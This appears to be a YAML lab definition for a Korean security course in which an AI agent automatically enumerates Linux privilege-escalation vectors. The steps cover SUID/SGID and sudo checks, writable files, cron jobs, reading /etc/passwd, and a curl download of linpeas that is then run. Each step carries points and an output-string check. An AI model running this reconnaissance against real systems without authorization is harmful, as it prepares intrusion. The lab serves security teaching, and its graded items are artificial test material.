lab_id: "battle-ai-week05"
title: "AI 권한 상승 — 자동 탐색"
version: "ai"
course: "battle-ai"
week: 5
description: "AI 에이전트가 SUID 바이너리, sudo 설정, 커널 취약점 등 권한 상승 벡터를 자동으로 탐색한다."
difficulty: "medium"
duration_minutes: 90
objectives:
  - "AI가 SUID/SGID 바이너리를 자동 탐색한다"
  - "AI가 sudo 설정의 취약점을 자동 분석한다"
  - "AI가 linpeas로 종합 권한 상승 벡터를 탐색한다"
  - "AI가 발견된 벡터의 위험도를 평가한다"
prerequisites:
  - "Week 04 AI 패스워드 공격 완료"
  - "Linux 권한 시스템 이해"
infra_requirements:
  - "attacker VM with bastion"
  - "defender VM (low-priv shell access)"
pass_threshold: 0.6
steps:
  - order: 1
    instruction: "AI가 SUID/SGID 설정된 바이너리를 자동 검색한다"
    script: |
      echo "=== SUID 바이너리 탐색 ==="
      find / -perm -4000 -type f 2>/dev/null | head -30
      echo ""
      echo "=== SGID 바이너리 탐색 ==="
      find / -perm -2000 -type f 2>/dev/null | head -30
      echo ""
      echo "SUID/SGID 탐색 완료"
    category: "exploit"
    risk_level: "medium"
    points: 15
    verify:
      type: "output_contains"
      expect: "SUID 바이너리 탐색"
      field: "stdout"

  - order: 2
    instruction: "AI가 sudo 설정을 분석하여 권한 상승 가능 여부를 확인한다"
    script: |
      echo "=== sudo 권한 확인 ==="
      sudo -l 2>&1 | head -30
      echo ""
      echo "=== /etc/sudoers 접근 가능 여부 ==="
      ls -la /etc/sudoers 2>&1
      echo ""
      echo "=== sudoers.d 디렉토리 ==="
      ls -la /etc/sudoers.d/ 2>/dev/null || echo "접근 불가"
      echo ""
      echo "sudo 분석 완료"
    category: "exploit"
    risk_level: "medium"
    points: 15
    verify:
      type: "output_contains"
      expect: "sudo 분석 완료"
      field: "stdout"

  - order: 3
    instruction: "AI가 쓰기 가능한 중요 파일/디렉토리를 탐색한다"
    script: |
      echo "=== World-writable 파일 탐색 ==="
      find / -writable -type f 2>/dev/null | grep -v "/proc\|/sys\|/dev" | head -20
      echo ""
      echo "=== Cron 작업 탐색 ==="
      ls -la /etc/cron* 2>/dev/null | head -20
      cat /etc/crontab 2>/dev/null | head -20
      echo ""
      echo "=== PATH 인젝션 가능 여부 ==="
      echo $PATH
      echo ""
      echo "쓰기 권한 탐색 완료"
    category: "exploit"
    risk_level: "medium"
    points: 15
    verify:
      type: "output_contains"
      expect: "쓰기 권한 탐색 완료"
      field: "stdout"

  - order: 4
    instruction: "AI가 linpeas를 다운로드하고 종합 권한 상승 벡터 탐색을 수행한다"
    script: |
      echo "=== LinPEAS 실행 ==="
      if [ -f /tmp/linpeas.sh ]; then
        echo "LinPEAS 이미 존재"
      else
        curl -sL https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh -o /tmp/linpeas.sh 2>/dev/null
        chmod +x /tmp/linpeas.sh
      fi
      if [ -f /tmp/linpeas.sh ]; then
        /tmp/linpeas.sh -q 2>&1 | head -100
      else
        echo "LinPEAS 다운로드 실패 — 수동 열거 수행"
        echo "커널 버전: $(uname -r)"
        echo "OS: $(cat /etc/os-release | head -3)"
        id
        cat /etc/passwd | grep -v nologin | grep -v false
      fi
      echo ""
      echo "LinPEAS 탐색 완료"
    category: "exploit"
    risk_level: "medium"
    points: 20
    verify:
      type: "output_contains"
      expect: "LinPEAS"
      field: "stdout"

  - order: 5
    instruction: "AI가 발견된 권한 상승 벡터를 위험도별로 분류하여 보고한다"
    script: |
      echo "=== AI 권한 상승 탐색 보고서 ===" > /tmp/privesc_report.txt
      echo "대상: $(hostname)" >> /tmp/privesc_report.txt
      echo "현재 사용자: $(whoami)" >> /tmp/privesc_report.txt
      echo "테스트 시간: $(date)" >> /tmp/privesc_report.txt
      echo "" >> /tmp/privesc_report.txt
      echo "[SUID 바이너리]" >> /tmp/privesc_report.txt
      find / -perm -4000 -type f 2>/dev/null | wc -l | xargs -I{} echo "  발견: {}개" >> /tmp/privesc_report.txt
      echo "" >> /tmp/privesc_report.txt
      echo "[sudo 설정]" >> /tmp/privesc_report.txt
      sudo -l 2>&1 | head -5 >> /tmp/privesc_report.txt
      echo "" >> /tmp/privesc_report.txt
      echo "[커널 정보]" >> /tmp/privesc_report.txt
      uname -a >> /tmp/privesc_report.txt
      echo "" >> /tmp/privesc_report.txt
      echo "[위험도 평가]" >> /tmp/privesc_report.txt
      echo "  - 상세 분석은 linpeas 출력 참조" >> /tmp/privesc_report.txt
      cat /tmp/privesc_report.txt
    category: "analysis"
    risk_level: "low"
    points: 15
    verify:
      type: "output_contains"
      expect: "AI 권한 상승 탐색 보고서"
      field: "stdout"
